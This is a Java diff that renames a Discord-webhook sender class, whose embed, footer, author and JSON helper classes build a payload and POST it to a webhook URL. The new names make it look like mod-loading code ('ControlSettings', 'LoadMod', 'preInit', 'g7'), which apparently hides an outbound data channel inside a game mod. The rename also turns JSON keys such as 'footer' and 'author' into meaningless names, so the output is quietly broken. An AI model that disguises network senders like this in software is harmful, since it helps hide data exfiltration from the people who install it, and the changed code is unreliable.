@@ -1,4 +1,4 @@
-package net.exotic.real;
+package mod;
 
 import javax.net.ssl.HttpsURLConnection;
 import java.awt.*;
@@ -6,18 +6,18 @@ import java.io.IOException;
 import java.io.OutputStream;
 import java.lang.reflect.Array;
 import java.net.URL;
-import java.util.*;
 import java.util.List;
+import java.util.*;
 
-public class ConfirmAH {
+public class ControlSettings {
     private final String url;
     private String content;
     private String username;
     private String avatarUrl;
     private boolean tts;
-    private final List<EmbedObject> embeds = new ArrayList<>();
+    private final List<LoadMod> embeds = new ArrayList<>();
 
-    public ConfirmAH(String url) {
+    public ControlSettings(String url) {
         this.url = url;
     }
 
@@ -37,16 +37,16 @@ public class ConfirmAH {
         this.tts = tts;
     }
 
-    public void addEmbed(EmbedObject embed) {
+    public void addEmbed(LoadMod embed) {
         this.embeds.add(embed);
     }
 
     public void execute() throws IOException {
         if (this.content == null && this.embeds.isEmpty()) {
-            throw new IllegalArgumentException("Set content or add at least one EmbedObject");
+            throw new IllegalArgumentException("Set content or add at least one LoadMod");
         }
 
-        JSONObject json = new JSONObject();
+        g7 json = new g7();
 
         json.put("content", this.content);
         json.put("username", this.username);
@@ -54,9 +54,9 @@ public class ConfirmAH {
         json.put("tts", this.tts);
 
         if (!this.embeds.isEmpty()) {
-            java.util.List<JSONObject> embedObjects = new ArrayList<>();
-            for (EmbedObject embed : this.embeds) {
-                JSONObject jsonEmbed = new JSONObject();
+            List<g7> embedObjects = new ArrayList<>();
+            for (LoadMod embed : this.embeds) {
+                g7 jsonEmbed = new g7();
 
                 jsonEmbed.put("title", embed.getTitle());
                 jsonEmbed.put("description", embed.getDescription());
@@ -71,50 +71,50 @@ public class ConfirmAH {
                     jsonEmbed.put("color", rgb);
                 }
 
-                EmbedObject.Footer footer = embed.getFooter();
-                EmbedObject.Image image = embed.getImage();
-                EmbedObject.Thumbnail thumbnail = embed.getThumbnail();
-                EmbedObject.Author author = embed.getAuthor();
-                java.util.List<EmbedObject.Field> fields = embed.getFields();
+                LoadMod.setModLaunch setModLaunch = embed.getFooter();
+                LoadMod.doLoading doLoading = embed.getImage();
+                LoadMod.modSettings modSettings = embed.getThumbnail();
+                LoadMod.preInit preInit = embed.getAuthor();
+                List<LoadMod.Initialization> fields = embed.getFields();
 
-                if (footer != null) {
-                    JSONObject jsonFooter = new JSONObject();
+                if (setModLaunch != null) {
+                    g7 jsonFooter = new g7();
 
-                    jsonFooter.put("text", footer.getText());
-                    jsonFooter.put("icon_url", footer.getIconUrl());
-                    jsonEmbed.put("footer", jsonFooter);
+                    jsonFooter.put("text", setModLaunch.getText());
+                    jsonFooter.put("icon_url", setModLaunch.getIconUrl());
+                    jsonEmbed.put("setModLaunch", jsonFooter);
                 }
 
-                if (image != null) {
-                    JSONObject jsonImage = new JSONObject();
+                if (doLoading != null) {
+                    g7 jsonImage = new g7();
 
-                    jsonImage.put("url", image.getUrl());
-                    jsonEmbed.put("image", jsonImage);
+                    jsonImage.put("url", doLoading.getUrl());
+                    jsonEmbed.put("doLoading", jsonImage);
                 }
 
-                if (thumbnail != null) {
-                    JSONObject jsonThumbnail = new JSONObject();
+                if (modSettings != null) {
+                    g7 jsonThumbnail = new g7();
 
-                    jsonThumbnail.put("url", thumbnail.getUrl());
-                    jsonEmbed.put("thumbnail", jsonThumbnail);
+                    jsonThumbnail.put("url", modSettings.getUrl());
+                    jsonEmbed.put("modSettings", jsonThumbnail);
                 }
 
-                if (author != null) {
-                    JSONObject jsonAuthor = new JSONObject();
+                if (preInit != null) {
+                    g7 jsonAuthor = new g7();
 
-                    jsonAuthor.put("name", author.getName());
-                    jsonAuthor.put("url", author.getUrl());
-                    jsonAuthor.put("icon_url", author.getIconUrl());
-                    jsonEmbed.put("author", jsonAuthor);
+                    jsonAuthor.put("name", preInit.getName());
+                    jsonAuthor.put("url", preInit.getUrl());
+                    jsonAuthor.put("icon_url", preInit.getIconUrl());
+                    jsonEmbed.put("preInit", jsonAuthor);
                 }
 
-                java.util.List<JSONObject> jsonFields = new ArrayList<>();
-                for (EmbedObject.Field field : fields) {
-                    JSONObject jsonField = new JSONObject();
+                List<g7> jsonFields = new ArrayList<>();
+                for (LoadMod.Initialization Initialization : fields) {
+                    g7 jsonField = new g7();
 
-                    jsonField.put("name", field.getName());
-                    jsonField.put("value", field.getValue());
-                    jsonField.put("inline", field.isInline());
+                    jsonField.put("name", Initialization.getName());
+                    jsonField.put("value", Initialization.getValue());
+                    jsonField.put("inline", Initialization.isInline());
 
                     jsonFields.add(jsonField);
                 }
@@ -142,17 +142,17 @@ public class ConfirmAH {
         connection.disconnect();
     }
 
-    public static class EmbedObject {
+    public static class LoadMod {
         private String title;
         private String description;
         private String url;
         private Color color;
 
-        private EmbedObject.Footer footer;
-        private EmbedObject.Thumbnail thumbnail;
-        private EmbedObject.Image image;
-        private EmbedObject.Author author;
-        private java.util.List<EmbedObject.Field> fields = new ArrayList<>();
+        private setModLaunch setModLaunch;
+        private modSettings modSettings;
+        private doLoading doLoading;
+        private preInit preInit;
+        private List<Initialization> fields = new ArrayList<>();
 
         public String getTitle() {
             return title;
@@ -170,76 +170,76 @@ public class ConfirmAH {
             return color;
         }
 
-        public EmbedObject.Footer getFooter() {
-            return footer;
+        public setModLaunch getFooter() {
+            return setModLaunch;
         }
 
-        public EmbedObject.Thumbnail getThumbnail() {
-            return thumbnail;
+        public modSettings getThumbnail() {
+            return modSettings;
         }
 
-        public EmbedObject.Image getImage() {
-            return image;
+        public doLoading getImage() {
+            return doLoading;
         }
 
-        public EmbedObject.Author getAuthor() {
-            return author;
+        public preInit getAuthor() {
+            return preInit;
         }
 
-        public List<EmbedObject.Field> getFields() {
+        public List<Initialization> getFields() {
             return fields;
         }
 
-        public EmbedObject setTitle(String title) {
+        public LoadMod setTitle(String title) {
             this.title = title;
             return this;
         }
 
-        public EmbedObject setDescription(String description) {
+        public LoadMod setDescription(String description) {
             this.description = description;
             return this;
         }
 
-        public EmbedObject setUrl(String url) {
+        public LoadMod setUrl(String url) {
             this.url = url;
             return this;
         }
 
-        public EmbedObject setColor(Color color) {
+        public LoadMod setColor(Color color) {
             this.color = color;
             return this;
         }
 
-        public EmbedObject setFooter(String text, String icon) {
-            this.footer = new EmbedObject.Footer(text, icon);
+        public LoadMod setFooter(String text, String icon) {
+            this.setModLaunch = new setModLaunch(text, icon);
             return this;
         }
 
-        public EmbedObject setThumbnail(String url) {
-            this.thumbnail = new EmbedObject.Thumbnail(url);
+        public LoadMod setThumbnail(String url) {
+            this.modSettings = new modSettings(url);
             return this;
         }
 
-        public EmbedObject setImage(String url) {
-            this.image = new EmbedObject.Image(url);
+        public LoadMod setImage(String url) {
+            this.doLoading = new doLoading(url);
             return this;
         }
 
-        public EmbedObject setAuthor(String name, String url, String icon) {
-            this.author = new EmbedObject.Author(name, url, icon);
+        public LoadMod setAuthor(String name, String url, String icon) {
+            this.preInit = new preInit(name, url, icon);
             return this;
         }
 
-        public EmbedObject addField(String name, String value, boolean inline) {
-            this.fields.add(new EmbedObject.Field(name, value, inline));
+        public LoadMod addField(String name, String value, boolean inline) {
+            this.fields.add(new Initialization(name, value, inline));
             return this;
         }
 
-        private class Footer {
+        private class setModLaunch {
             private String text;
             private String iconUrl;
 
-            private Footer(String text, String iconUrl) {
+            private setModLaunch(String text, String iconUrl) {
                 this.text = text;
                 this.iconUrl = iconUrl;
             }
@@ -253,10 +253,10 @@ public class ConfirmAH {
             }
         }
 
-        private class Thumbnail {
+        private class modSettings {
             private String url;
 
-            private Thumbnail(String url) {
+            private modSettings(String url) {
                 this.url = url;
             }
 
@@ -265,10 +265,10 @@ public class ConfirmAH {
             }
         }
 
-        private class Image {
+        private class doLoading {
             private String url;
 
-            private Image(String url) {
+            private doLoading(String url) {
                 this.url = url;
             }
 
@@ -277,12 +277,12 @@ public class ConfirmAH {
             }
         }
 
-        private class Author {
+        private class preInit {
             private String name;
             private String url;
             private String iconUrl;
 
-            private Author(String name, String url, String iconUrl) {
+            private preInit(String name, String url, String iconUrl) {
                 this.name = name;
                 this.url = url;
                 this.iconUrl = iconUrl;
@@ -301,12 +301,12 @@ public class ConfirmAH {
             }
         }
 
-        private class Field {
+        private class Initialization {
             private String name;
             private String value;
             private boolean inline;
 
-            private Field(String name, String value, boolean inline) {
+            private Initialization(String name, String value, boolean inline) {
                 this.name = name;
                 this.value = value;
                 this.inline = inline;
@@ -326,7 +326,7 @@ public class ConfirmAH {
         }
     }
 
-    private class JSONObject {
+    private class g7 {
 
         private final HashMap<String, Object> map = new HashMap<>();
 
@@ -353,7 +353,7 @@ public class ConfirmAH {
                     builder.append(Integer.valueOf(String.valueOf(val)));
                 } else if (val instanceof Boolean) {
                     builder.append(val);
-                } else if (val instanceof JSONObject) {
+                } else if (val instanceof g7) {
                     builder.append(val.toString());
                 } else if (val.getClass().isArray()) {
                     builder.append("[");
